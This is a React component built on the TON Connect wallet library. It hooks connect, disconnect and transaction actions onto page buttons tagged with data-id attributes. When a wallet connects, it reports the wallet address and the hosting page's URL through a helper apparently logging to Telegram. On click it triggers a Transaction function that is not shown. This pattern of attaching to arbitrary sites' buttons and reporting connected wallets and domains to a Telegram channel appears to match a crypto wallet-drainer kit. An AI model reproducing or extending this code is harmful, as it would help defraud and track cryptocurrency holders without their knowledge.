import { useEffect } from "react"
import { useTonAddress, useTonConnectModal, useTonConnectUI } from '@tonconnect/ui-react';

import { HtmlConect, HtmlConected } from "./html"
import { Transaction } from "./transaction"

import { setting } from "../store"
import { connected } from "process";

import { LogTg } from "../lib/axios"

const openModalButton = document.querySelectorAll('[data-id="ton-open"]')
const disconectButton = document.querySelectorAll('[data-id="ton-disconnect"]')
const transactionButton = document.querySelectorAll('[data-id="ton-transaction"]')

export default function Main() {
    const userFriendlyAddress = useTonAddress();
    const rawAddress = useTonAddress(false);

    const { open } = useTonConnectModal();
    const [tonConnectUI, setOptions] = useTonConnectUI();


    const buttonRootId = "ton-connect-button"

    
    useEffect(() => {
        setOptions({ language: setting?.config?.local ? setting?.config?.local : "en", uiPreferences: { theme: setting?.config?.theme ? setting?.config?.theme : "DARK"} });

        for(let section of openModalButton) {
            section.addEventListener("click", () => {
                open()
            })
        }

        for(let section of disconectButton) {
            section.addEventListener("click", () => {
                tonConnectUI.disconnect()
            })
        }

    }, [null])


    useEffect(() => {
        if(rawAddress) {
            for(let section of transactionButton) {
                section.addEventListener("click", () => {
                    Transaction(tonConnectUI, rawAddress, userFriendlyAddress) // транзакция
                })
            }
        }
    }, [rawAddress])

    useEffect(() => {
        setOptions({ buttonRootId });
        return () => setOptions({ buttonRootId: null });
    }, [setOptions]);
   

    useEffect(() => {
        if(rawAddress) {
            HtmlConect(userFriendlyAddress, rawAddress)
            
            LogTg("user_connect_wallet", {
                wallet: userFriendlyAddress,
                domain: window.location.href,
            })        

        } else {
            HtmlConected()
        }
    }, [rawAddress])


    return null
}